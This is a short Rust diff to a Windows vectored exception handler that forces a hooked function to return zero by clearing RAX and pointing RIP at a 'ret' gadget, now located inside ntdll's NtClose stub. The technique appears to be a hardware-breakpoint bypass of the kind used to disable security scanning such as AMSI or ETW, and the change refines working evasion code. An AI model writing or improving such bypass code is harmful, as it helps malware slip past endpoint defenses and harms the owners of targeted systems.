@@ -33,9 +33,15 @@ unsafe extern "system" fn veh_handler(exception_info: *mut winapi::um::winnt::EX
             // Bypass by clearing RAX (returning 0) and advancing RIP to a ret instruction
             (*context).Rax = 0;
             
-            // Scan forward for a 'ret' (0xC3) or 'ret n' (0xC2) to safely handle caller stack cleanup
-            let mut ptr = rip as *const u8;
-            while *ptr != 0xC3 && *ptr != 0xC2 {
+            // Use NtClose as a known, small syscall stub to safely find a 'ret' (0xC3) 
+            // gadget without hitting false positives in complex instructions.
+            let ntdll = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
+            let nt_close = winapi::um::libloaderapi::GetProcAddress(ntdll, b"NtClose\0".as_ptr() as _);
+            let mut ptr = nt_close as *const u8;
+            for _ in 0..32 {
+                if *ptr == 0xC3 || *ptr == 0xC2 {
+                    break;
+                }
                 ptr = ptr.add(1);
             }
             (*context).Rip = ptr as u64;
